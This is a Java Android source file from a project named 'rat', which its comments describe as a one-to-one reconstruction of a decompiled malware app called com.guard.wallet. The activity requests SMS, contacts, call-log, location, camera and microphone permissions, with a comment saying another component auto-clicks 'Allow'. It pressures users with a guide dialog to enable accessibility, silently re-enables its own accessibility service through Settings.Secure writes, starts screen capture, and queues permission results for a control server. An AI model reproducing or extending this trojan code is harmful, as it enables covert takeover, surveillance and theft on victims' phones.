package com.vendor.rat.activity;

// ADAPT: vendor = com.guard.wallet.activity.MainActivity (345 行)
// 一比一复刻: WebView(#303133) + 引导弹窗 + 12种权限回调 + 8种运行时权限回调

import android.Manifest;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.view.WindowManager;
import android.widget.LinearLayout;
import android.widget.Toast;

import com.vendor.rat.MainApplication;
import com.vendor.rat.config.AppConfig;
import com.vendor.rat.control.service.MediaLiveService;
import com.vendor.rat.service.MyAccessibilityService;
import com.vendor.rat.utils.SharedUtils;

import java.lang.ref.WeakReference;
import java.util.Objects;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;

/**
 * ADAPT: vendor = com.guard.wallet.activity.MainActivity
 * 职责:
 *   1. 展示 WebView 主界面 (#303133 背景)
 *   2. 无障碍未开启时显示引导弹窗 (vendor: utils/b.f())
 *   3. 处理 12 种 onActivityResult 权限回调
 *   4. 处理 8 种 onRequestPermissionsResult 运行时权限回调
 *   5. 双击返回退出
 */
public class ActivMain extends Activity {

    private static final String TAG = "MainActivity";

    // ADAPT: vendor request codes (PointerIconCompat 常量)
    public static final int REQUEST_STORAGE = 1001;
    public static final int REQUEST_INSTALL = 1002;
    public static final int REQUEST_MEDIA_PROJECTION = 1003;
    public static final int REQUEST_OVERLAY = 1004;
    // 1005 unused
    public static final int REQUEST_USAGE_ACCESS = 1006;
    public static final int REQUEST_FOREGROUND_LOCATION = 1007;
    public static final int REQUEST_BACKGROUND_LOCATION = 1008;
    public static final int REQUEST_AUTO_START = 1009;
    public static final int REQUEST_BATTERY_WHITELIST = 1010;
    public static final int REQUEST_SMS = 1011;
    public static final int REQUEST_PHONE = 1012;
    public static final int REQUEST_PERMISSION_BY_CODE = 1013;
    public static final int REQUEST_NOTIFICATION = 1014;
    public static final int REQUEST_READ_WRITE = 1015;
    public static final int REQUEST_SYSTEM_SETTINGS = 1016;

    // ADAPT: vendor field f133a → webViewRef (WeakReference<AppWebView>)
    public WeakReference<AppWebView> webViewRef;
    // ADAPT: vendor field b → lastBackPressTime
    public Long lastBackPressTime;

    // ADAPT: vendor = utils/b 的静态字段，移到这里管理
    // vendor: utils/b.f274a → guideDialogRef
    private static WeakReference<AlertDialog> guideDialogRef;
    // vendor: utils/b.c → currentActivityRef
    private static volatile WeakReference<Activity> currentActivityRef;
    // vendor: utils/b.b → isRestricted (AtomicBoolean)
    private static final AtomicBoolean isRestricted = new AtomicBoolean(true);
    // vendor: utils/b.f275d → guidePageIndex
    private static final AtomicInteger guidePageIndex = new AtomicInteger(0);

    // ============ onCreate (vendor 行 156-178) ============

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // vendor: requestWindowFeature(1) = FEATURE_NO_TITLE
        requestWindowFeature(1);

        // vendor: #303133 背景 (3处设置)
        getWindow().getDecorView().setBackgroundColor(Color.parseColor("#303133"));
        getWindow().setBackgroundDrawable(new ColorDrawable(Color.parseColor("#303133")));

        // vendor: new e(getApplicationContext(), false) — 自定义 WebView
        AppWebView webView = new AppWebView(getApplicationContext(), false);

        // vendor: LinearLayout 容器
        LinearLayout linearLayout = new LinearLayout(this);
        WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams();
        layoutParams.width = -1;  // MATCH_PARENT
        layoutParams.height = -1; // MATCH_PARENT
        linearLayout.setBackgroundColor(Color.parseColor("#303133"));
        setContentView(linearLayout, layoutParams);

        // vendor: this.f133a = new WeakReference(eVar)
        this.webViewRef = new WeakReference<>(webView);

        // vendor: 添加 WebView 到容器
        WindowManager.LayoutParams layoutParams2 = new WindowManager.LayoutParams();
        layoutParams2.width = -1;
        layoutParams2.height = -1;
        linearLayout.addView(this.webViewRef.get(), layoutParams2);

        // vendor: window type = 2038 (TYPE_APPLICATION_OVERLAY)
        WindowManager.LayoutParams attributes = getWindow().getAttributes();
        attributes.type = 2038;
        getWindow().setAttributes(attributes);

        // vendor: this.b = Long.valueOf(System.currentTimeMillis())
        this.lastBackPressTime = Long.valueOf(System.currentTimeMillis());

        // vendor: b.d(this) — 注册当前 Activity + 发送广播
        registerCurrentActivity(this);
    }

    /**
     * 批量请求所有危险权限
     * 系统会逐个弹出权限对话框，PermissionAutoGrantEngine 自动点击"允许"
     */
    private void requestAllPermissions() {
        String[] permissions = {
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.CALL_PHONE,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_PHONE_STATE,
        };

        // 过滤出未授予的权限
        java.util.List<String> needed = new java.util.ArrayList<>();
        for (String perm : permissions) {
            if (checkSelfPermission(perm) != PackageManager.PERMISSION_GRANTED) {
                needed.add(perm);
            }
        }

        if (!needed.isEmpty()) {
            Log.d(TAG, "Requesting " + needed.size() + " permissions");
            requestPermissions(needed.toArray(new String[0]), REQUEST_PERMISSION_BY_CODE);
        }
    }

    // ============ onResume (vendor 行 309-339, 一比一对齐) ============

    @Override
    public void onResume() {
        super.onResume();

        WeakReference<AppWebView> ref = this.webViewRef;
        if (ref == null || ref.get() == null) {
            return;
        }
        AppWebView webView = ref.get();

        webView.onResume();

        // vendor 原始逻辑: if (MyAccessibilityService.P() == null && !g.j())
        // P() = 无障碍服务静态引用
        // g.j() = 有 WRITE_SECURE_SETTINGS 权限
        if (MyAccessibilityService.P() == null && !isAdbSecureMode()) {
            // vendor: synchronized (h.class) { e2 = h.e("adbCanWriteSecure"); }
            boolean adbCanWriteSecure = SharedUtils.getBoolean("adbCanWriteSecure");
            if (!adbCanWriteSecure) {
                // vendor: 加载引导页 + 显示引导弹窗
                webView.loadUrl(getGuideUrl());
                webView.setGuide(true);
                showGuideDialog();
                return;
            }
        }

        // ADAPT: vendor 在 CheckProcessThread 中调用 g.L() 恢复无障碍
        // 当前 CheckProcessThread 尚未完整实现 g.L() 调用链
        // 临时在 onResume 中触发: 有权限但无障碍未运行 → 自动恢复
        if (MyAccessibilityService.P() == null && isAdbSecureMode()) {
            new Thread(() -> {
                if (tryAutoEnableAccessibility(getApplicationContext())) {
                    Log.d(TAG, "Auto re-enabled accessibility via WRITE_SECURE_SETTINGS");
                }
            }, "accessibility-restore").start();
        }

        // vendor: 已开启无障碍 或 有 WRITE_SECURE_SETTINGS → 加载主页
        if (webView.getPageFinished() && webView.getUrl() != null) {
            String url = webView.getUrl();
            Objects.requireNonNull(url);
            if (url.startsWith(getMainUrl())) {
                Log.d(TAG, "Main url is load finished");
                dismissGuideDialog();
            }
        }

        // vendor: 加载主页 + 关闭引导模式
        webView.loadUrl(getMainUrl());
        webView.setGuide(false);
        dismissGuideDialog();
    }

    // ============ onPause (vendor 行 221-228) ============

    @Override
    public void onPause() {
        super.onPause();
        WeakReference<AppWebView> ref = this.webViewRef;
        if (ref == null || ref.get() == null) {
            return;
        }
        ref.get().onPause();
    }

    // ============ onDestroy (vendor 行 181-188) ============

    @Override
    public void onDestroy() {
        WeakReference<AppWebView> ref = this.webViewRef;
        if (ref != null && ref.get() != null) {
            ref.get().destroy();
            this.webViewRef = null;
        }
        super.onDestroy();
    }

    // ============ onDetachedFromWindow (vendor 行 191-193) ============

    @Override
    public void onDetachedFromWindow() {
        super.onDetachedFromWindow();
    }

    // ============ onStart (vendor 行 342-344) ============

    @Override
    public void onStart() {
        super.onStart();
    }

    // ============ onKeyDown: 双击返回退出 (vendor 行 196-218) ============

    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode != KeyEvent.KEYCODE_BACK || event.getAction() != KeyEvent.ACTION_DOWN) {
            return super.onKeyDown(keyCode, event);
        }

        // vendor: WebView 返回键处理
        WeakReference<AppWebView> ref = this.webViewRef;
        if (ref != null && ref.get() != null) {
            // vendor: if (f304a.get()) return false — 引导模式下不拦截
            if (ref.get().isGuide.get()) {
                return false;
            }
            if (ref.get().canGoBack()) {
                ref.get().goBack();
                return true;
            }
        }

        // vendor: 双击退出逻辑
        if (System.currentTimeMillis() - this.lastBackPressTime.longValue() > 2000) {
            this.lastBackPressTime = Long.valueOf(System.currentTimeMillis());
            // vendor: 从 BuildConfig 获取退出确认文本，默认 "Press again to exit"
            AppConfig config = getAppConfig();
            String exitText = (config == null || config.getExitConfirm() == null || config.getExitConfirm().isEmpty())
                    ? "Press again to exit"
                    : config.getExitConfirm();
            Toast.makeText(this, exitText, Toast.LENGTH_SHORT).show();
        } else {
            finish();
        }
        return true;
    }

    // ============ onActivityResult: 12 种权限回调 (vendor 行 39-153) ============

    @Override
    public void onActivityResult(int requestCode, int resultCode, Intent data) {
        String logMsg;

        switch (requestCode) {
            case REQUEST_INSTALL: // 1002
                if (resultCode != RESULT_OK) {
                    logMsg = "安装应用程序申请失败";
                    Log.e(TAG, logMsg);
                } else {
                    logMsg = "安装应用程序申请成功";
                    Log.d(TAG, logMsg);
                }
                break;

            case REQUEST_MEDIA_PROJECTION: // 1003
                if (Build.VERSION.SDK_INT < 29) {
                    // vendor: a.b().g(intent) — 低版本直接处理
                    // TODO: VENDOR_VERIFY — 低版本录屏处理
                    Log.d(TAG, "MediaProjection result (API < 29)");
                } else {
                    // vendor: startForegroundService(MediaLiveService)
                    Intent intent2 = new Intent(this, MediaLiveService.class);
                    intent2.putExtra("code", resultCode);
                    intent2.putExtra("data", data);
                    startForegroundService(intent2);
                }
                break;

            case REQUEST_OVERLAY: // 1004
                if (resultCode != RESULT_OK) {
                    logMsg = "悬浮窗权限申请失败";
                    Log.e(TAG, logMsg);
                } else {
                    logMsg = "悬浮窗权限申请成功";
                    Log.d(TAG, logMsg);
                }
                break;

            case REQUEST_USAGE_ACCESS: // 1006
                if (resultCode != RESULT_OK) {
                    logMsg = "使用情况访问权限申请失败";
                    Log.e(TAG, logMsg);
                } else {
                    logMsg = "使用情况访问权限申请成功";
                    Log.d(TAG, logMsg);
                }
                break;

            case REQUEST_AUTO_START: // 1009
                if (resultCode != RESULT_OK) {
                    logMsg = "自启动权限申请失败";
                    Log.e(TAG, logMsg);
                } else {
                    logMsg = "自启动权限申请成功";
                    Log.d(TAG, logMsg);
                }
                break;

            case REQUEST_BATTERY_WHITELIST: // 1010
                if (resultCode != RESULT_OK) {
                    logMsg = "电量优化白名单权限申请失败";
                    Log.e(TAG, logMsg);
                } else {
                    logMsg = "电量优化白名单权限申请成功";
                    Log.d(TAG, logMsg);
                }
                break;

            case REQUEST_PERMISSION_BY_CODE: // 1013
                if (resultCode != RESULT_OK) {
                    logMsg = "REQUEST_PERMISSION_BY_CODE 申请失败";
                    Log.e(TAG, logMsg);
                } else {
                    logMsg = "REQUEST_PERMISSION_BY_CODE 申请成功";
                    Log.d(TAG, logMsg);
                }
                break;

            case REQUEST_READ_WRITE: // 1015
                if (resultCode != RESULT_OK) {
                    logMsg = "设备读写权限申请失败";
                    Log.e(TAG, logMsg);
                } else {
                    logMsg = "设备读写权限申请成功";
                    Log.d(TAG, logMsg);
                }
                break;

            case REQUEST_SYSTEM_SETTINGS: // 1016
                if (resultCode != RESULT_OK) {
                    logMsg = "设备系统项修改权限申请失败";
                    Log.e(TAG, logMsg);
                } else {
                    logMsg = "设备系统项修改权限申请成功";
                    Log.d(TAG, logMsg);
                }
                break;

            default:
                super.onActivityResult(requestCode, resultCode, data);
                break;
        }

        // vendor: 发送 PermissionResponseVO 到消息队列
        sendPermissionResponse(requestCode, resultCode != RESULT_OK ? 0 : 1);
    }

    // ============ onRequestPermissionsResult: 8 种运行时权限 (vendor 行 231-306) ============

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        String logMsg;
        boolean granted = grantResults.length > 0 && grantResults[0] == 0;

        switch (requestCode) {
            case REQUEST_STORAGE: // 1001
                logMsg = granted ? "设备读写权限申请成功" : "设备读写权限申请失败";
                if (granted) { Log.d(TAG, logMsg); } else { Log.e(TAG, logMsg); }
                break;

            case REQUEST_FOREGROUND_LOCATION: // 1007
                logMsg = granted ? "前台位置信息权限申请成功" : "前台位置信息权限申请失败";
                if (granted) { Log.d(TAG, logMsg); } else { Log.e(TAG, logMsg); }
                break;

            case REQUEST_BACKGROUND_LOCATION: // 1008
                logMsg = granted ? "后台位置信息权限申请成功" : "后台位置信息权限申请失败";
                if (granted) { Log.d(TAG, logMsg); } else { Log.e(TAG, logMsg); }
                break;

            case REQUEST_SMS: // 1011
                logMsg = granted ? "短信权限申请成功" : "短信权限申请失败";
                Log.d(TAG, logMsg);
                break;

            case REQUEST_PHONE: // 1012
                logMsg = granted ? "电话权限申请成功" : "电话权限申请失败";
                Log.d(TAG, logMsg);
                break;

            case REQUEST_PERMISSION_BY_CODE: // 1013
                if (granted) {
                    logMsg = "REQUEST_PERMISSION_BY_CODE 申请成功";
                    Log.d(TAG, logMsg);
                } else {
                    logMsg = "REQUEST_PERMISSION_BY_CODE 申请失败";
                    Log.e(TAG, logMsg);
                }
                break;

            case REQUEST_NOTIFICATION: // 1014
                if (granted) {
                    logMsg = "通知权限申请成功";
                    Log.d(TAG, logMsg);
                } else {
                    logMsg = "通知权限申请失败";
                    Log.e(TAG, logMsg);
                }
                break;

            default:
                super.onRequestPermissionsResult(requestCode, permissions, grantResults);
                break;
        }

        // vendor: 发送 PermissionResponseVO
        sendPermissionResponse(requestCode, granted ? 1 : 0);
    }

    // ============ 引导弹窗 (vendor: utils/b.f(), 行 77-104) ============

    private void showGuideDialog() {
        // vendor: 如果已经在显示则跳过
        WeakReference<AlertDialog> ref = guideDialogRef;
        if (ref != null && ref.get() != null && ref.get().isShowing()) {
            return;
        }

        AppConfig config = getAppConfig();

        // vendor: 从 BuildConfig 获取文本，默认英文
        String alertTitle = (config == null || config.getAlertTitle() == null || config.getAlertTitle().isEmpty())
                ? "Open [accessibility_service_label]"
                : config.getAlertTitle();

        String alertMsg = (config == null || config.getAlertMsg() == null || config.getAlertMsg().isEmpty())
                ? "1.Click go immediately and enter accessibility service column\n2.Pull down to the bottom,find already downloaded(installed) apps,and click to enter this column\n3.Find [accessibility_service_label],and click to enter this column\n4.Click the switch(in the top right corner),you can open [accessibility_service_label]"
                : config.getAlertMsg();

        String okText = (config == null || config.getOkText() == null || config.getOkText().isEmpty())
                ? "Go immediately"
                : config.getOkText();

        // vendor: AlertDialog.Builder(activity, 4) — 4 = THEME_DEVICE_DEFAULT_DARK
        AlertDialog.Builder builder = new AlertDialog.Builder(this, 4);

        // vendor: builder.setCustomTitle(new e0.a(activity, alertTitle))
        // TODO: VENDOR_VERIFY — vendor 用自定义 LinearLayout 标题视图 (含图标+文本)
        // 当前简化为 setTitle，后续可替换为自定义 View
        builder.setTitle(alertTitle);

        builder.setMessage(alertMsg);
        builder.setCancelable(false);

        // vendor: 如果 isRestricted=false，显示 "Allow restricted settings" 按钮
        if (!isRestricted.get()) {
            String restrictedText = (config == null || config.getAllowRestricted() == null || config.getAllowRestricted().isEmpty())
                    ? "Allow restricted settings"
                    : config.getAllowRestricted();
            builder.setNeutralButton(restrictedText, (dialog, which) -> {
                // vendor: new com.guard.wallet.helper.j(1) — 打开受限设置
                // TODO: VENDOR_VERIFY — 受限设置跳转逻辑
                Log.d(TAG, "Allow restricted settings clicked");
            });
        }

        // vendor: "Go immediately" → 跳转无障碍设置
        builder.setPositiveButton(okText, (dialog, which) -> {
            // vendor: new com.guard.wallet.helper.j(2) — 跳转无障碍设置
            try {
                Intent intent = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
            } catch (Exception e) {
                Log.e(TAG, "Failed to open accessibility settings", e);
            }
        });

        // vendor: builder.setOnDismissListener / setOnCancelListener
        builder.setOnDismissListener(dialog -> {
            // vendor: new com.guard.wallet.helper.k(1)
        });
        builder.setOnCancelListener(dialog -> {
            // vendor: new a()
        });

        WeakReference<AlertDialog> dialogRef = new WeakReference<>(builder.create());
        guideDialogRef = dialogRef;
        dialogRef.get().show();
    }

    // vendor: utils/b.b() — 关闭引导弹窗
    private static void dismissGuideDialog() {
        WeakReference<AlertDialog> ref = guideDialogRef;
        if (ref == null || ref.get() == null) {
            return;
        }
        ref.get().dismiss();
        guideDialogRef = null;
    }

    // ============ 辅助方法 ============

    // vendor: utils/b.d(activity) — 注册当前 Activity + 发送广播
    private static void registerCurrentActivity(Activity activity) {
        synchronized (Activity.class) {
            currentActivityRef = new WeakReference<>(activity);
            if (currentActivityRef != null && currentActivityRef.get() != null) {
                Intent intent = new Intent();
                intent.setAction("guide.vpn.service.stop.action");
                currentActivityRef.get().sendBroadcast(intent);
            }
        }
    }

    // vendor: utils/b.c() — 获取引导页 URL
    private String getGuideUrl() {
        AppConfig config = getAppConfig();
        String host = (config == null || config.getGuideAccessibilityHost() == null || config.getGuideAccessibilityHost().isEmpty())
                ? "https://guide.accessibility.rathat.org"
                : config.getGuideAccessibilityHost();
        String url = host + "/guide/" + String.valueOf(guidePageIndex.get());
        Log.d("AccessibilityUtils", url);
        return url;
    }

    // vendor: utils/d.f() — 获取主页 URL
    private String getMainUrl() {
        AppConfig config = getAppConfig();
        return (config == null || config.getMainUrl() == null || config.getMainUrl().isEmpty())
                ? "https://m.baidu.com/"
                : config.getMainUrl();
    }

    // vendor: 获取 AppConfig
    private AppConfig getAppConfig() {
        MainApplication app = MainApplication.getInstance();
        if (app != null) {
            return app.getConfig();
        }
        return null;
    }

    // vendor: 发送权限回调结果到消息队列
    private void sendPermissionResponse(int requestCode, int granted) {
        // vendor: PermissionResponseVO + MessageRecordVO → HandlerMsgAndTimer.b()
        // TODO: VENDOR_VERIFY — 需要 MODULE_01 网络通信模块完成后对接消息队列
        Log.d(TAG, "PermissionResponse: code=" + requestCode + " granted=" + granted);
    }

    // vendor: g.j() — 检查是否有 WRITE_SECURE_SETTINGS 权限
    private boolean isAdbSecureMode() {
        return checkCallingOrSelfPermission("android.permission.WRITE_SECURE_SETTINGS")
                == android.content.pm.PackageManager.PERMISSION_GRANTED;
    }

    /**
     * vendor: g.L() — 自动重新启用无障碍服务
     *
     * 一比一对齐 vendor 逻辑:
     * 1. 前置: 必须有 WRITE_SECURE_SETTINGS 权限
     * 2. 如果已启用 (x()): 先移除自身 (C())，等待 2 秒 (T0(10))
     * 3. 如果未启用 (!x()): 添加自身到列表，写入 4 个 Secure 值
     */
    public static boolean tryAutoEnableAccessibility(android.content.Context context) {
        if (context == null) return false;
        // vendor: if (Z() == null || !j()) return false
        if (androidx.core.content.ContextCompat.checkSelfPermission(context,
                "android.permission.WRITE_SECURE_SETTINGS") != android.content.pm.PackageManager.PERMISSION_GRANTED) {
            return false;
        }
        try {
            android.content.ContentResolver cr = context.getContentResolver();
            String packageName = context.getPackageName();

            // vendor: g.f0() — 自身服务组件名
            String serviceName = packageName + "/.service.MyAccessibilityService";

            // vendor: if (x() && C()) { T0(10); }
            // 如果已启用: 先移除自身，等 2 秒再重新添加
            if (isAccessibilityServiceEnabled(context)) {
                removeAccessibilityService(context);
                // vendor: T0(10) — sleep 200ms * 10 = 2s
                try { Thread.sleep(2000); } catch (InterruptedException ignored) {}
            }

            // vendor: if (!x()) — 未启用则添加
            if (!isAccessibilityServiceEnabled(context)) {
                // vendor: g.q0() — 读取当前已启用列表
                String existing = android.provider.Settings.Secure.getString(cr, "enabled_accessibility_services");
                java.util.LinkedHashSet<String> services = new java.util.LinkedHashSet<>();
                if (existing != null && !existing.isEmpty()) {
                    String[] split = android.text.TextUtils.split(existing, ":");
                    if (split != null && split.length > 0) {
                        services.addAll(java.util.Arrays.asList(split));
                    }
                }

                // vendor: q02.add(f02.get(0))
                services.add(serviceName);
                String join = android.text.TextUtils.join(":", services);

                // vendor: 写入 4 个 Settings.Secure 值
                boolean ok = android.provider.Settings.Secure.putString(cr, "enabled_accessibility_services", join)
                        && android.provider.Settings.Secure.putInt(cr, "accessibility_enabled", 1)
                        && android.provider.Settings.Secure.putInt(cr, "touch_exploration_enabled", 1)
                        && android.provider.Settings.Secure.putString(cr, "touch_exploration_granted_accessibility_services", join);

                if (ok) {
                    Log.d(TAG, "本地启动无障碍服务成功");
                }
                return ok;
            }
            return true;
        } catch (Exception e) {
            Log.e(TAG, "tryAutoEnableAccessibility failed", e);
            return false;
        }
    }

    /**
     * vendor: g.C() — 从已启用列表中移除自身无障碍服务
     */
    private static boolean removeAccessibilityService(android.content.Context context) {
        try {
            android.content.ContentResolver cr = context.getContentResolver();
            String packageName = context.getPackageName();
            String serviceName = packageName + "/.service.MyAccessibilityService";
            String serviceName2 = packageName + "/com.vendor.rat.service.MyAccessibilityService";

            // vendor: g.q0()
            String existing = android.provider.Settings.Secure.getString(cr, "enabled_accessibility_services");
            java.util.LinkedHashSet<String> services = new java.util.LinkedHashSet<>();
            if (existing != null && !existing.isEmpty()) {
                String[] split = android.text.TextUtils.split(existing, ":");
                if (split != null && split.length > 0) {
                    services.addAll(java.util.Arrays.asList(split));
                }
            }

            // vendor: 移除自身
            services.remove(serviceName);
            services.remove(serviceName2);

            String join = services.isEmpty() ? "" : android.text.TextUtils.join(":", services);
            return android.provider.Settings.Secure.putString(cr, "enabled_accessibility_services", join);
        } catch (Exception e) {
            Log.e(TAG, "removeAccessibilityService failed", e);
            return false;
        }
    }

    /**
     * vendor: g.x() — 检查无障碍是否在系统已启用列表中
     */
    public static boolean isAccessibilityServiceEnabled(android.content.Context context) {
        try {
            String enabledServices = android.provider.Settings.Secure.getString(
                    context.getContentResolver(), "enabled_accessibility_services");
            if (enabledServices == null || enabledServices.isEmpty()) {
                return false;
            }
            String packageName = context.getPackageName();
            // vendor: g.f0() — 两种组件名格式
            String serviceName1 = packageName + "/.service.MyAccessibilityService";
            String serviceName2 = packageName + "/com.vendor.rat.service.MyAccessibilityService";

            String[] services = android.text.TextUtils.split(enabledServices, ":");
            for (String service : services) {
                if (service.equals(serviceName1) || service.equals(serviceName2)) {
                    return true;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "isAccessibilityServiceEnabled check failed", e);
        }
        return false;
    }

    // 获取当前 Activity 引用 (供其他模块使用)
    public static Activity getCurrentActivity() {
        WeakReference<Activity> ref = currentActivityRef;
        return ref != null ? ref.get() : null;
    }
}
